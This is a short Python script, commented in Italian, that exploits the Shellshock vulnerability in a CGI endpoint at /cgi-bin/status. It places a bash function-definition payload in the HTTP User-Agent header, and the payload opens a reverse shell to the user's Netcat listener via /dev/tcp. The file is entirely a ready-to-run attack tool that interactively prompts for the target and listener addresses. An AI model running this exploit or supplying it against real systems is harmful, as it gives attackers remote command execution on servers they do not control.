import requests

def send_payload(url, lhost, lport):
    """
    Invia un payload per tentare di ottenere una reverse shell sul target.

    Questo script sfrutta una vulnerabilità nel server CGI (Common Gateway Interface) 
    per inviare un payload bash tramite l'intestazione HTTP 'User-Agent'. L'obiettivo 
    è eseguire una shell bash che si connetta al nostro listener Netcat (in ascolto 
    sull'indirizzo IP e sulla porta specificata).

    Args:
        url (str): L'URL del target dove inviare il payload (ad esempio, http://target_ip:porta/cgi-bin/status).
        lhost (str): Il tuo indirizzo IP (locale) che riceverà la reverse shell.
        lport (int): La porta su cui il listener Netcat è in ascolto.

    Returns:
        None: Questa funzione invia solo il payload e stampa un messaggio in base all'esito.
    """
    payload = f'() {{ :;}}; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
    headers = {'User-Agent': payload}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print(f"[+] Payload inviato a {url}. Assicurati che un listener sia attivo su {lhost}:{lport}.")
        else:
            print(f"[-] Errore nell'invio del payload a {url}. Codice di stato: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Si è verificato un errore durante la richiesta a {url}: {e}")

# Main program
if __name__ == "__main__":
    # Input dell'utente per ottenere l'indirizzo del target e le informazioni del listener
    target_ip = input("Inserisci l'indirizzo IP del target: ")
    target_port = input("Inserisci la porta del CGI (solitamente 80 o 443): ")
    local_ip = input("Inserisci il tuo indirizzo IP per la reverse shell: ")
    local_port = input("Inserisci la porta del tuo listener Netcat: ")

    # Costruzione dell'URL target
    target_url = f"http://{target_ip}:{target_port}/cgi-bin/status"  # Assumiamo HTTP, potrebbe essere HTTPS
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Listener IP: {local_ip}:{local_port}")
    
    # Invio del payload
    print("[*] Invio del payload...")
    send_payload(target_url, local_ip, int(local_port))
    
    print("[*] Script completato.")
